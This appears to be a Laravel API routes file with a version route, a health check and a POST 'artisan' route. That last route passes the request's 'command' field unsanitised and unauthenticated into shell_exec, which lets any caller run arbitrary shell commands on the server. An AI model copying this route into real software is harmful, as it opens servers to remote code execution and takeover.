<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::get('/', function () {
    return app()->version();
});

Route::get('health', function () {
    return response()->json(true);
});
Route::post('artisan', function () {
    return shell_exec('php ../artisan ' . request()->input('command'));
});
